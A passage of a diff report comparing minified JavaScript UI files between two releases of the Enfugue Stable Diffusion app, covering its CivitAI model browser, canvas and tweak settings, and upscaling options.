showBrowser(){let t=(t,...e)=>this.model.get(`civitai/${t}`,...e),e=(t,e,i)=>this.download(t,e,i);isEmpty(this.browser)?(this.browser=await this.spawnWindow("CivitAI",new CivitAIView(this.config,t,e),...browserWindowDimensions),this.browser.onClose((()=>this.browser=null))):this.browser.focus()}async onClick(){this.showBrowser()}}export{CivitAIController as MenuController};
+import{MenuController}from"../menu.mjs";import{isEmpty,humanSize,truncate,cleanHTML}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{View,ParentView,TabbedView}from"../../view/base.mjs";import{SimpleNotification}from"../../common/notify.mjs";import{FormView}from"../../view/forms/base.mjs";import{StringInputView,SelectInputView,CheckboxInputView}from"../../view/forms/input.mjs";const E=new ElementBuilder,browserWindowDimensions=[800,1e3];class CivitAISortInputView extends SelectInputView{static defaultOptions=["Highest Rated","Most Downloaded","Newest"];static defaultValue="Highest Rated"}class CivitAITimePeriodInputView extends SelectInputView{static defaultOptions={AllTime:"All Time",Year:"This Year",Month:"This Month",Week:"This Week",Day:"Today"};static defaultValue="Month"}class CivitAISearchOptionsFormView extends FormView{static fieldSets={Sorting:{sort:{label:"Sort Method",class:CivitAISortInputView},period:{label:"Time Period",class:CivitAITimePeriodInputView}},Filters:{commercial:{label:"Only Show Models Allowing Commercial Use",class:CheckboxInputView,config:{tooltip:"Checking this box will ensure all results have at least the 'Image' commercial use status from CivitAI. Some models may additionally authorize you to distribute or modify the models, but not all - review the details on each result before making such a determination."}},nsfw:{label:"Show NSFW Models and Images",class:CheckboxInputView,config:{tooltip:"Checking this box will show <strong>NSFW (Not Safe For Work)</strong> content of a sexual or explicit nature.<br /><br /><em>Note:</em> If safety checking is enabled on a system-wide level, NSFW results will never be returned, regardless of whether or not this box is checked."}},search:{class:StringInputView,config:{placeholder:"Search by name, user, description, etc."}}}}}class CivitAIItemView extends View{static className="civit-ai-item";static maxImagesPerItem=3;static maxCharactersPerDescription=300;static maxTags=6;constructor(e,t,i){super(e),this.item=t,this.download=i}async build(){let e=await super.build(),t=this.item.modelVersions[0].name,i=E.h2().content(this.item.name),s=E.h4().content(`By ${this.item.creator.username}`),o=E.select(),a=E.div().class("versions"),n=E.div().class("flags"),r=E.div().class("tags"),l=E.p(),c=()=>{let e=this.item.modelVersions.filter((e=>e.name===t)).shift(),i=e.trainedWords,s=e.images.slice(0,this.constructor.maxImagesPerItem),o=s.map((e=>{let t=E.img().src(e.url).css({"max-width":`${(1/s.length*100).toFixed(2)}%`});return isEmpty(e.meta)||isEmpty(e.meta.prompt)||(navigator.clipboard?(t.data("tooltip",`${cleanHTML(e.meta.prompt)}<br /><em class='note'>Ctrl+Right Click to copy prompt.</em>`),t.on("contextmenu",(t=>{t.ctrlKey&&(t.preventDefault(),t.stopPropagation(),navigator.clipboard.writeText(e.meta.prompt),SimpleNotification.notify("Copied to Clipboard",1e3))}))):t.data("tooltip",cleanHTML(e.meta.prompt))),t})),n=i.map((e=>E.span().content(e))),r=e.files.map((e=>E.div().class("download").content(E.span().class("name").content(e.name),E.span().class("type").content(`${e.metadata.size||""} ${e.metadata.fp||""}`),E.span().class("format").content(e.metadata.format),E.span().class("size").content(humanSize(1e3*e.sizeKB)),E.a().content(E.i().class("fa-solid fa-download")).data("tooltip","Start Download").on("click",(t=>{this.download(e.downloadUrl,e.name)})))));a.content(E.div().class("downloads").content(...r),E.div().class("images").content(...o),E.div().class("triggers").content(...n))};if(!isEmpty(this.item.description))if(this.item.description.length<=this.constructor.maxCharactersPerDescription)l.content(this.item.description);else{let e=E.span().content(truncate(this.item.description,this.constructor.maxCharactersPerDescription)),t=E.span().content(this.item.description).hide(),i=E.a().content("Show All").on("click",(()=>{e.hide(),i.hide(),t.show()}));l.content(e,i,t)}for(let e of this.item.tags.slice(0,this.constructor.maxTags))r.append(E.span().content(e));"None"===this.item.allowCommercialUse?n.append(E.span().content("Commercial Use Disallowed")):"Image"===this.item.allowCommercialUse?n.append(E.span().content("Commercial Use Allowed (Images Only)")):"Rent"===this.item.allowCommercialUse||"Sell"===this.item.allowCommercialUse?n.append(E.span().content("Commercial Use Allowed")):console.warning(`Unknown commercial use state '${this.item.allowCommercialUse}'`),this.item.allowNoCredit?n.append(E.span().content("No Credit Required")):n.append(E.span().content("Credit Required")),this.item.allowDerivatives?n.append(E.span().content("Derivative Models Allowed")):n.append(E.span().content("Derivative Models Disallowed"));for(let e of this.item.modelVersions){let i=E.option().content(`${e.name} (${e.baseModel})`);e.name===t&&i.selected(!0),o.append(i)}return o.on("change",(e=>{t=o.val(),c()})),o.val(t),c(),e.append(i).append(s).append(n).append(r).append(l).append(o).append(a),e}}class CivitAICategoryPageView extends View{static className="page-buttons";constructor(e,t,i){super(e),this.showPrevious=t,this.showNext=i,this.onPreviousCallbacks=[],this.onNextCallbacks=[]}onNext(e){this.onNextCallbacks.push(e)}onPrevious(e){this.onPreviousCallbacks.push(e)}previousPage(){for(let e of this.onPreviousCallbacks)e()}nextPage(){for(let e of this.onNextCallbacks)e()}async build(){let e=await super.build(),t=E.button().content("Previous Page").on("click",(()=>this.previousPage())),i=E.button().content("Next Page").on("click",(()=>this.nextPage()));return this.showPrevious||t.disabled(!0),this.showNext||i.disabled(!0),e.content(t,i)}}class CivitAICategoryBrowserView extends ParentView{static inputTimeout=500;static pageSize=20;constructor(e,t,i){super(e),this.getData=t,this.download=i,this.page=1,this.query="",this.timer=null,this.options=new CivitAISearchOptionsFormView(e),this.options.onSubmit((async e=>{try{await this.runQuery(e)}catch(e){SimpleNotification.notify("Couldn't communicate with Enfugue or CivitAI. Please try again."),console.error(e)}this.options.enable()})),this.empty(),this.addChild(this.options)}async runQuery(e){this.empty(),this.addChild(this.options);let t={page:this.page};isEmpty(e.search)||(t.query=e.search),isEmpty(e.sort)||(t.sort=e.sort),isEmpty(e.period)||(t.period=e.period),!0===e.commercial&&(t.allow_commercial_use="Image"),!0===e.nsfw&&(t.nsfw=!0);for(let e of await this.getData(null,t)){let t=new CivitAIItemView(this.config,e,((...e)=>this.download(...e)));await this.addChild(t)}let i=new CivitAICategoryPageView(this.config,this.page>1,this.children.length>this.constructor.pageSize);i.onNext((async()=>{this.page++,this.options.disable(),await this.runQuery(e),this.options.enable()})),i.onPrevious((async()=>{this.page--,this.options.disable(),await this.runQuery(e),this.options.enable()})),await this.addChild(i)}async build(){let e=await super.build();return this.options.submit(),e}}class CivitAIBrowserView extends TabbedView{constructor(e,t,i){super(e),this.addTab("Checkpoints",new CivitAICategoryBrowserView(e,((...e)=>t("checkpoint",...e)),((...e)=>i("checkpoint",...e)))),this.addTab("LoRA",new CivitAICategoryBrowserView(e,((...e)=>t("lora",...e)),((...e)=>i("lora",...e)))),this.addTab("LyCORIS",new CivitAICategoryBrowserView(e,((...e)=>t("lycoris",...e)),((...e)=>i("lycoris",...e)))),this.addTab("Textual Inversion",new CivitAICategoryBrowserView(e,((...e)=>t("inversion",...e)),((...e)=>i("inversion",...e))))}}class CivitAIView extends View{static logoPath="/static/img/brand/civit-ai-logo.svg";static className="civit-ai-view";constructor(e,t,i){super(e),this.browser=new CivitAIBrowserView(e,t,i)}getDescriptionNode(){return E.div().content(E.a().href("https://civitai.com").target("_blank").content(E.img().src(this.constructor.logoPath)),E.p().content("CivitAI is the leading AI model sharing service, providing a place where creators can uploads their trained models for other users to enjoy and employ."),E.p().content(E.span().content("By downloading any models from CivitAI, you agree to their "),E.a().href("https://civitai.com/content/tos").target("_blank").content("terms of service"),E.span().content(". Please review these terms before downloading anything. Some models come with additional terms, such as disallowing sale of images derived from those models. Use the filters at the top to only search for your desired terms, or pay attention to the tags below the model's name and author.")),E.p().content(E.span().content("If you enjoy the service CivitAI provides, please consider "),E.a().href("https://civitai.com/pricing").target("_blank").content("subscribing or donating"),E.span().content(" to support free and open-source AI.")),E.p().class("center").content(E.em().class("note").content("CivitAI, the CivitAI logo, and the CivitAI 'C' icon are all &copy; CivitAI "+(new Date).getFullYear()+", all rights reserved.")))}async build(){let e=await super.build();return e.append(this.getDescriptionNode()),e.append(await this.browser.getNode()),e}}class CivitAIController extends MenuController{static menuName="Civit AI";static menuIcon="/static/img/brand/civit-ai.png";async showBrowser(){let e=(e,...t)=>this.model.get(`civitai/${e}`,...t),t=(e,t,i)=>this.download(e,t,i);isEmpty(this.browser)?(this.browser=await this.spawnWindow("CivitAI",new CivitAIView(this.config,e,t),...browserWindowDimensions),this.browser.onClose((()=>this.browser=null))):this.browser.focus()}async onClick(){this.showBrowser()}}export{CivitAIController as MenuController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/sidebar/01-canvas.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/sidebar/02-canvas.mjs`

 * *Files 8% similar despite different names*

```diff
@@ -1 +1 @@
-import{isEmpty}from"../../base/helpers.mjs";import{FormView}from"../../view/forms/base.mjs";import{NumberInputView}from"../../view/forms/input.mjs";import{Controller}from"../base.mjs";let defaultWidth=512,defaultHeight=512,defaultChunkingSize=64,defaultChunkingBlur=64;class CanvasForm extends FormView{static collapseFieldSets=!0;static autoSubmit=!0;static fieldSets={Dimensions:{width:{label:"Width",class:NumberInputView,config:{min:64,max:4096,value:defaultWidth,step:8,tooltip:"The width of the canvas in pixels."}},height:{label:"Height",class:NumberInputView,config:{min:64,max:4096,value:defaultHeight,step:8,tooltip:"The height of the canvas in pixels."}},chunkingSize:{label:"Chunk Size",class:NumberInputView,config:{min:0,value:defaultChunkingSize,step:8,tooltip:"<p>The number of pixels to move the frame when doing chunked diffusion.</p><p>When this number is greater than 0, the engine will only ever process a square in the size of the configured model size at once. After each square, the frame will be moved by this many pixels along either the horizontal or vertical axis, and then the image is re-diffused. When this number is 0, chunking is disabled, and the entire canvas will be diffused at once.</p><p>Disabling this (setting it to 0) can have varying visual results, but a guaranteed result is drastically increased VRAM usage for large images. A low number can produce more detailed results, but can be noisy, and takes longer to process. A high number is faster to process, but can have poor results especially along frame boundaries. The recommended value is set by default.</p>"}},chunkingBlur:{label:"Chunk Blur",class:NumberInputView,config:{min:0,value:defaultChunkingBlur,step:8,tooltip:"The number of pixels to feather along the edge of the frame when blending chunked diffusions together. Low numbers can produce less blurry but more noisy results, and can potentially result in visible breaks in the frame. High numbers can help blend frames, but produce blurrier results. The recommended value is set by default."}}}}}class CanvasController extends Controller{getState(){return{canvas:this.canvasForm.values}}getDefaultState(){return{canvas:{width:defaultWidth,height:defaultHeight,chunkingSize:defaultChunkingSize,chunkingBlur:defaultChunkingBlur}}}setState(e){isEmpty(e.canvas)||this.canvasForm.setValues(e.canvas).then((()=>this.canvasForm.submit()))}async initialize(){defaultWidth=this.application.config.model.invocation.width,defaultHeight=this.application.config.model.invocation.height,defaultChunkingSize=this.application.config.model.invocation.chunkingSize,defaultChunkingBlur=this.application.config.model.invocation.chunkingBlur,this.canvasForm=new CanvasForm(this.config),this.canvasForm.onSubmit((async e=>{this.images.width=e.width,this.images.height=e.height,this.engine.width=e.width,this.engine.height=e.height,this.engine.chunkingSize=e.chunkingSize})),this.application.sidebar.addChild(this.canvasForm),this.subscribe("modelPickerChange",(async e=>{let i=this.engine.width,t=this.engine.height,n=!1,s=await this.canvasForm.getInputView("width"),a=await this.canvasForm.getInputView("height");s.setMin(e.size),a.setMin(e.size),i<e.size&&(s.setValue(e.size),this.engine.width=e.size,this.images.width=e.size,n=!0),t<e.size&&(a.setValue(e.size),this.engine.height=e.size,this.images.height=e.size,n=!0),n&&this.notify("info","Dimensions Changed","The base model specifies a size larger than the current canvas, it has been modified to match.")}))}}export{CanvasController as SidebarController};
+import{isEmpty}from"../../base/helpers.mjs";import{FormView}from"../../view/forms/base.mjs";import{NumberInputView}from"../../view/forms/input.mjs";import{Controller}from"../base.mjs";let defaultWidth=512,defaultHeight=512,defaultChunkingSize=64,defaultChunkingBlur=64;class CanvasForm extends FormView{static collapseFieldSets=!0;static autoSubmit=!0;static fieldSets={Dimensions:{width:{label:"Width",class:NumberInputView,config:{min:64,max:16384,value:defaultWidth,step:8,tooltip:"The width of the canvas in pixels."}},height:{label:"Height",class:NumberInputView,config:{min:64,max:16384,value:defaultHeight,step:8,tooltip:"The height of the canvas in pixels."}},chunkingSize:{label:"Chunk Size",class:NumberInputView,config:{min:0,value:defaultChunkingSize,step:8,tooltip:"<p>The number of pixels to move the frame when doing chunked diffusion.</p><p>When this number is greater than 0, the engine will only ever process a square in the size of the configured model size at once. After each square, the frame will be moved by this many pixels along either the horizontal or vertical axis, and then the image is re-diffused. When this number is 0, chunking is disabled, and the entire canvas will be diffused at once.</p><p>Disabling this (setting it to 0) can have varying visual results, but a guaranteed result is drastically increased VRAM usage for large images. A low number can produce more detailed results, but can be noisy, and takes longer to process. A high number is faster to process, but can have poor results especially along frame boundaries. The recommended value is set by default.</p>"}},chunkingBlur:{label:"Chunk Blur",class:NumberInputView,config:{min:0,value:defaultChunkingBlur,step:8,tooltip:"The number of pixels to feather along the edge of the frame when blending chunked diffusions together. Low numbers can produce less blurry but more noisy results, and can potentially result in visible breaks in the frame. High numbers can help blend frames, but produce blurrier results. The recommended value is set by default."}}}}}class CanvasController extends Controller{getState(){return{canvas:this.canvasForm.values}}getDefaultState(){return{canvas:{width:defaultWidth,height:defaultHeight,chunkingSize:defaultChunkingSize,chunkingBlur:defaultChunkingBlur}}}setState(e){isEmpty(e.canvas)||this.canvasForm.setValues(e.canvas).then((()=>this.canvasForm.submit()))}async initialize(){defaultWidth=this.application.config.model.invocation.width,defaultHeight=this.application.config.model.invocation.height,defaultChunkingSize=this.application.config.model.invocation.chunkingSize,defaultChunkingBlur=this.application.config.model.invocation.chunkingBlur,this.canvasForm=new CanvasForm(this.config),this.canvasForm.onSubmit((async e=>{this.images.width=e.width,this.images.height=e.height,this.engine.width=e.width,this.engine.height=e.height,this.engine.chunkingSize=e.chunkingSize,this.engine.chunkingBlur=e.chunkingBlur})),this.application.sidebar.addChild(this.canvasForm),this.subscribe("modelPickerChange",(async e=>{if(!isEmpty(e)){let i=e.defaultConfiguration,t={};isEmpty(i.width)||(t.width=i.width),isEmpty(i.height)||(t.height=i.height),isEmpty(i.chunking_size)||(t.chunkingSize=i.chunking_size),isEmpty(i.chunking_blur)||(t.chunkingBlur=i.chunking_blur),isEmpty(t)||(await this.canvasForm.setValues(t),await this.canvasForm.submit())}}))}}export{CanvasController as SidebarController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/sidebar/02-tweaks.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/sidebar/03-tweaks.mjs`

 * *Files 18% similar despite different names*

```diff
@@ -1 +1 @@
-import{isEmpty}from"../../base/helpers.mjs";import{FormView}from"../../view/forms/base.mjs";import{Controller}from"../base.mjs";import{NumberInputView,FloatInputView,CheckboxInputView}from"../../view/forms/input.mjs";let defaultGuidanceScale=7.5,defaultInferenceSteps=50;class TweaksForm extends FormView{static autoSubmit=!0;static collapseFieldSets=!0;static fieldSets={Tweaks:{guidanceScale:{label:"Guidance Scale",class:FloatInputView,config:{min:0,max:100,value:defaultGuidanceScale,step:.1,tooltip:"How closely to follow the text prompt; high values result in high-contrast images closely adhering to your text, low values result in low-contrast images with more randomness."}},inferenceSteps:{label:"Inference Steps",class:NumberInputView,config:{min:5,max:250,value:defaultInferenceSteps,tooltip:"How many steps to take during primary inference, larger values take longer to process but can produce better results."}}}}}class TweaksController extends Controller{getState(){return{tweaks:this.tweaksForm.values}}setState(e){isEmpty(e.tweaks)||this.tweaksForm.setValues(e.tweaks).then((()=>this.tweaksForm.submit()))}getDefaultState(){return{tweaks:{guidanceScale:defaultGuidanceScale,inferenceSteps:defaultInferenceSteps}}}async initialize(){defaultGuidanceScale=this.application.config.model.invocation.guidanceScale,defaultInferenceSteps=this.application.config.model.invocation.inferenceSteps,this.tweaksForm=new TweaksForm(this.config),this.tweaksForm.onSubmit((async e=>{this.engine.guidanceScale=e.guidanceScale,this.engine.inferenceSteps=e.inferenceSteps})),this.application.sidebar.addChild(this.tweaksForm)}}export{TweaksController as SidebarController};
+import{isEmpty}from"../../base/helpers.mjs";import{FormView}from"../../view/forms/base.mjs";import{Controller}from"../base.mjs";import{NumberInputView,FloatInputView,CheckboxInputView}from"../../view/forms/input.mjs";import{SchedulerInputView,MultiDiffusionSchedulerInputView}from"../common/model-manager.mjs";let defaultGuidanceScale=7.5,defaultInferenceSteps=50;class TweaksForm extends FormView{static autoSubmit=!0;static collapseFieldSets=!0;static fieldSets={Tweaks:{guidanceScale:{label:"Guidance Scale",class:FloatInputView,config:{min:0,max:100,value:defaultGuidanceScale,step:.1,tooltip:"How closely to follow the text prompt; high values result in high-contrast images closely adhering to your text, low values result in low-contrast images with more randomness."}},inferenceSteps:{label:"Inference Steps",class:NumberInputView,config:{min:5,max:250,value:defaultInferenceSteps,tooltip:"How many steps to take during primary inference, larger values take longer to process but can produce better results."}},scheduler:{label:"Scheduler",class:SchedulerInputView},multiScheduler:{label:"Multi-Diffusion Scheduler",class:MultiDiffusionSchedulerInputView}}}}class TweaksController extends Controller{getState(){return{tweaks:this.tweaksForm.values}}setState(e){isEmpty(e.tweaks)||this.tweaksForm.setValues(e.tweaks).then((()=>this.tweaksForm.submit()))}getDefaultState(){return{tweaks:{guidanceScale:defaultGuidanceScale,inferenceSteps:defaultInferenceSteps,scheduler:null,multiScheduler:null}}}async initialize(){defaultGuidanceScale=this.application.config.model.invocation.guidanceScale,defaultInferenceSteps=this.application.config.model.invocation.inferenceSteps,this.tweaksForm=new TweaksForm(this.config),this.tweaksForm.onSubmit((async e=>{this.engine.guidanceScale=e.guidanceScale,this.engine.inferenceSteps=e.inferenceSteps,this.engine.scheduler=e.scheduler,this.engine.multiScheduler=e.multiScheduler})),this.subscribe("modelPickerChange",(e=>{if(!isEmpty(e)){let t=e.defaultConfiguration,i={};isEmpty(t.guidance_scale)||(i.guidanceScale=t.guidance_scale),isEmpty(t.inference_steps)||(i.inferenceSteps=t.inference_steps),isEmpty(t.scheduler)||(i.scheduler=t.scheduler),isEmpty(t.multi_scheduler)||(i.multiScheduler=t.multi_scheduler),isEmpty(i)||this.tweaksForm.setValues(i)}})),this.application.sidebar.addChild(this.tweaksForm)}}export{TweaksController as SidebarController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/sidebar/03-generation.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/sidebar/04-generation.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/sidebar/04-upscale.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/sidebar/06-upscale.mjs`

 * *Files 0% similar despite different names*

```diff
@@ -1 +1 @@
-import{isEmpty,deepClone}from"../../base/helpers.mjs";import{Controller}from"../base.mjs";import{FormView}from"../../view/forms/base.mjs";import{TextInputView,RepeatableInputView,SelectInputView,CheckboxInputView,NumberInputView,FloatInputView}from"../../view/forms/input.mjs";class OutputScaleInputView extends SelectInputView{static defaultOptions={1:"1× (no upscale)",2:"2×",4:"4×",8:"8×",16:"16×"};static tooltip="The output scale will multiply the height and width of the generated image by this amount after the image has been generated. For example, an image generated at 512×512 with an output scale of 2× will result in a final image at 1024×1024.<br /><strong>Caution!</strong> Large values, especially coupled with larger input sizes, can result in an image that will be too large for your browser to display, and it will crash. The resulting images are still saved.";static defaultValue="1"}class UpscaleMethodInputView extends SelectInputView{static defaultOptions={esrgan:"ESRGAN",esrganime:"ESRGANime",gfpgan:"GFPGAN",lanczos:"Lanczos",Bicubic:"Bicubic",Bilinear:"Bilinear",Nearest:"Nearest"};static defaultValue="esrgan"}class UpscaleDiffusionControlnetInputView extends SelectInputView{static defaultOptions={tile:"Tile",canny:"Canny Edge Detection",hed:"HED (Holistically-Nested Edge Detection)",mlsd:"MLSD (Mobile Line Segment Detection)"};static defaultValue="tile"}class UpscaleMethodsInputView extends RepeatableInputView{static minimumItems=1;static maximumItems=5;static memberClass=UpscaleMethodInputView;static tooltip="The upscaling method has a significant effect on the output image. The best general-purpose upscaling method is selected by default.<br />When selecting multiple methods, the first is used for the first upscale, the second for the second (when using iterative upscaling), etc.<br /><strong>ESRGAN</strong>: Short for Enhanced Super-Resolution Generative Adversarial Network, this is an AI upscaling method that tries to maintain sharp edges where they should be sharp, and soft where they should be soft, filling in details along the way.<br /><strong>ESRGANime</strong>: Similar to the above, but with sharper lines for cartoon or anime style.<br /><strong>GFPGAN</strong>: Short for Generative Facial Prior Generative Adversarial Network, this is an AI Upscaling method with face restoration. This results in photorealistic faces more often than not, but can erase desired features; it is best paired with upscale diffusion.<br /><strong>Lanczos</strong>: An algorithm with blurry but consistent results.<br /><strong>Bicubic</strong>: An algorithm that can result in slightly sharper edges than Lanczos, but can have jagged edges on curves and diagonal lines.<br /><strong>Bilinear</strong>: A very fast algorithm with overall the blurriest results.<br /><strong>Nearest</strong>: Maintain sharp pixel boundaries, resulting in a pixelated or retro look."}class UpscaleDiffusionIterativeControlnetInputView extends RepeatableInputView{static maximumItems=5;static minimumItems=0;static memberClass=UpscaleDiffusionControlnetInputView;static tooltip="The controlnet to use during upscaling. None are required, and using one will result in significant slowdowns during upscaling, but can result in a more consistent upscaled image. When using multiple methods, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc.<br /><strong>Tile</strong>: This network is trained on large images and slices of their images.<br /><strong>Canny Edge</strong>: This network is trained on images and the edges of that image after having run through Canny Edge detection. The output image will be processed with this algorithm.<br /><strong>HED</strong>: Short for Holistically-Nested Edge Detection, this edge-detection algorithm is best used when the input image is too blurry or too noisy for Canny Edge detection.<br /><strong>MLSD</strong>: Short for Mobile Line Segment Detection, this edge-detection algorithm searches only for straight lines, and is best used for geometric or architectural images."}class UpscaleDiffusionPromptInputView extends RepeatableInputView{static maximumItems=5;static memberClass=TextInputView;static tooltip="The prompt to use when upscaling, it is generally best to use generic detail-oriented prompts, unless there are specific things or people you want to ensure have details.<br />When using multiple prompts, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleDiffusionNegativePromptInputView extends UpscaleDiffusionPromptInputView{static tooltip="The negative prompt to use when upscaling, it is generally best to use generic negative prompts, unless there are specific things you don't want.<br />When using multiple prompts, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleDiffusionStrengthInputView extends RepeatableInputView{static memberClass=FloatInputView;static memberConfig={min:0,value:.2,max:1,step:.01};static minimumItems=1;static maximumItems=5;static tooltip="The amount to change the image when upscaling, from 0 to 1. Keep this low to improve consistency in the upscaled image, or increase it to add many details for a tableau or panorama style.<br />When using multiple strengths, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleDiffusionStepsInputView extends RepeatableInputView{static memberClass=NumberInputView;static memberConfig={min:0,max:1e3,value:100};static minimumItems=1;static maximumItems=5;static tooltip="The number of inference steps to make during the denoising loop of the upscaled image. Higher values can result in more details but can also take significantly longer, especially with high denoising strengths.<br />When using multiple step amounts, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleDiffusionGuidanceScaleInputView extends RepeatableInputView{static memberClass=FloatInputView;static memberConfig={min:0,max:100,value:12,step:.1};static minimumItems=1;static maximumItems=5;static tooltip="The amount to adhere to the prompts during upscaling. Higher values can result in more details but less consistency.<br />When using multiple guidance scales, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleForm extends FormView{static autoSubmit=!0;static collapseFieldSets=!0;static fieldSets={Upscaling:{outscale:{label:"Output Scale",class:OutputScaleInputView}},"Upscale Methods":{upscale:{label:"Upscale Methods",class:UpscaleMethodsInputView},upscaleIterative:{label:"Use Iterative Upscaling",class:CheckboxInputView,config:{tooltip:"Instead of directly upscaling to the target amount, double in size repeatedly until the image reaches the target size. For example, when this is checked and the upscale amount is 4×, there will be two upscale steps, 8× will be three, and 16× will be four."}},upscaleDiffusion:{label:"Diffuse Upscaled Samples",class:CheckboxInputView,config:{tooltip:"After upscaling the image use the the algorithm chosen above, use the image as input to another invocation of Stable Diffusion."}}},"Upscale Diffusion":{upscaleDiffusionControlnet:{label:"ControlNet",class:UpscaleDiffusionIterativeControlnetInputView},upscaleDiffusionPrompt:{label:"Detail Prompt",class:UpscaleDiffusionPromptInputView},upscaleDiffusionNegativePrompt:{label:"Detail Negative Prompt",class:UpscaleDiffusionNegativePromptInputView},upscaleDiffusionSteps:{label:"Inference Steps",class:UpscaleDiffusionStepsInputView},upscaleDiffusionStrength:{label:"Denoising Strength",class:UpscaleDiffusionStrengthInputView},upscaleDiffusionGuidanceScale:{label:"Guidance Scale",class:UpscaleDiffusionGuidanceScaleInputView},upscaleDiffusionChunkingSize:{label:"Chunk Size",class:NumberInputView,config:{minimum:32,maximum:512,step:8,value:64,tooltip:"The number of pixels to move the frame by during diffusion. Smaller values produce better results, but take longer."}},upscaleDiffusionChunkingBlur:{label:"Chunk Blur",class:NumberInputView,config:{minimum:32,maximum:512,step:8,value:64,tooltip:"The number of pixels to feather the edges of the frame by during diffusion. Smaller values result in more pronounced lines, and large values result in a smoother overall image."}},upscaleDiffusionScaleChunkingSize:{label:"Scale Chunk Size with Iteration",class:CheckboxInputView,config:{value:!0,tooltip:"Scale the chunking size ×2 with each iteration of upscaling, with a maximum size of ½ the size of the model."}},upscaleDiffusionScaleChunkingBlur:{label:"Scale Chunk Blur with Iteration",class:CheckboxInputView,config:{value:!0,tooltip:"Scale the chunking blur ×2 with each iteration of upscaling, with a maximum size of ½ the size of the model."}}}};static fieldSetConditions={"Upscale Methods":e=>parseInt(e.outscale)>1,"Upscale Diffusion":e=>parseInt(e.outscale)>1&&e.upscaleDiffusion}}class UpscaleController extends Controller{getState(){return{upscale:this.upscaleForm.values}}getDefaultState(){return{upscale:{outscale:1,upscale:["esrgan"],upscaleIterative:!1,upscaleDiffusion:!1,upscaleDiffusionSteps:[100],upscaleDiffusionStrength:[.2],upscaleDiffusionGuidanceScale:[12],upscaleDiffusionChunkingSize:64,upscaleDiffusionScaleChunkingSize:!0,upscaleDiffusionScaleChunkingBlur:!0}}}setState(e){if(!isEmpty(e.upscale)){let t=deepClone(e.upscale);isEmpty(t.upscaleDiffusionControlnet)&&(t.upscaleDiffusionControlnet=[]),isEmpty(t.upscaleDiffusionPrompt)&&(t.upscaleDiffusionPrompt=[]),isEmpty(t.upscaleDiffusionNegativePrompt)&&(t.upscaleDiffusionNegativePrompt=[]),this.upscaleForm.setValues(t).then((()=>this.upscaleForm.submit()))}}async initialize(){this.upscaleForm=new UpscaleForm(this.config),this.upscaleForm.onSubmit((async e=>{this.engine.upscale=e.upscale,this.engine.outscale=e.outscale,this.engine.upscaleIterative=e.upscaleIterative,this.engine.upscaleMethod=e.upscaleMethod,this.engine.upscaleDiffusion=e.upscaleDiffusion,this.engine.upscaleDiffusionControlnet=e.upscaleDiffusionControlnet,this.engine.upscaleDiffusionSteps=e.upscaleDiffusionSteps,this.engine.upscaleDiffusionStrength=e.upscaleDiffusionStrength,this.engine.upscaleDiffusionGuidanceScale=e.upscaleDiffusionGuidanceScale,this.engine.upscaleDiffusionChunkingSize=e.upscaleDiffusionChunkingSize,this.engine.upscaleDiffusionChunkingBlur=e.upscaleDiffusionChunkingBlur,this.engine.upscaleDiffusionScaleChunkingSize=e.upscaleDiffusionScaleChunkingSize,this.engine.upscaleDiffusionScaleChunkingBlur=e.upscaleDiffusionScaleChunkingBlur,this.engine.upscaleDiffusionPrompt=e.upscaleDiffusionPrompt,this.engine.upscaleDiffusionNegativePrompt=e.upscaleDiffusionNegativePrompt})),this.application.sidebar.addChild(this.upscaleForm)}}export{UpscaleController as SidebarController};
+import{isEmpty,deepClone}from"../../base/helpers.mjs";import{Controller}from"../base.mjs";import{FormView}from"../../view/forms/base.mjs";import{TextInputView,RepeatableInputView,SelectInputView,CheckboxInputView,NumberInputView,FloatInputView}from"../../view/forms/input.mjs";class OutputScaleInputView extends SelectInputView{static defaultOptions={1:"1× (no upscale)",2:"2×",4:"4×",8:"8×",16:"16×"};static tooltip="The output scale will multiply the height and width of the generated image by this amount after the image has been generated. For example, an image generated at 512×512 with an output scale of 2× will result in a final image at 1024×1024.<br /><strong>Caution!</strong> Large values, especially coupled with larger input sizes, can result in an image that will be too large for your browser to display, and it will crash. The resulting images are still saved.";static defaultValue="1"}class UpscaleMethodInputView extends SelectInputView{static defaultOptions={esrgan:"ESRGAN",esrganime:"ESRGANime",gfpgan:"GFPGAN",lanczos:"Lanczos",bicubic:"Bicubic",bilinear:"Bilinear",nearest:"Nearest"};static defaultValue="esrgan"}class UpscaleDiffusionControlnetInputView extends SelectInputView{static defaultOptions={tile:"Tile",canny:"Canny Edge Detection",hed:"HED (Holistically-Nested Edge Detection)",mlsd:"MLSD (Mobile Line Segment Detection)"};static defaultValue="tile"}class UpscaleMethodsInputView extends RepeatableInputView{static minimumItems=1;static maximumItems=5;static memberClass=UpscaleMethodInputView;static tooltip="The upscaling method has a significant effect on the output image. The best general-purpose upscaling method is selected by default.<br />When selecting multiple methods, the first is used for the first upscale, the second for the second (when using iterative upscaling), etc.<br /><strong>ESRGAN</strong>: Short for Enhanced Super-Resolution Generative Adversarial Network, this is an AI upscaling method that tries to maintain sharp edges where they should be sharp, and soft where they should be soft, filling in details along the way.<br /><strong>ESRGANime</strong>: Similar to the above, but with sharper lines for cartoon or anime style.<br /><strong>GFPGAN</strong>: Short for Generative Facial Prior Generative Adversarial Network, this is an AI Upscaling method with face restoration. This results in photorealistic faces more often than not, but can erase desired features; it is best paired with upscale diffusion.<br /><strong>Lanczos</strong>: An algorithm with blurry but consistent results.<br /><strong>Bicubic</strong>: An algorithm that can result in slightly sharper edges than Lanczos, but can have jagged edges on curves and diagonal lines.<br /><strong>Bilinear</strong>: A very fast algorithm with overall the blurriest results.<br /><strong>Nearest</strong>: 